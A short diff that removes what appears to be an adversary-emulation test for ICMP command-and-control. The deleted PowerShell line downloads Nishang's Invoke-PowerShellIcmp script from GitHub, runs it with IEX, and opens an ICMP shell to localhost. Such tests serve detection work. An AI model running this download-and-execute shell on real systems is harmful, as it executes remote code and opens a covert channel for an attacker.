@@ -1,8 +1,0 @@
-#TechniqueName: Non-Application Layer Protocol
-#AtomicTestName: ICMP C2
-#Language: ps1
-
-#commands
-IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
-Invoke-PowerShellIcmp -IPAddress 127.0.0.1
-
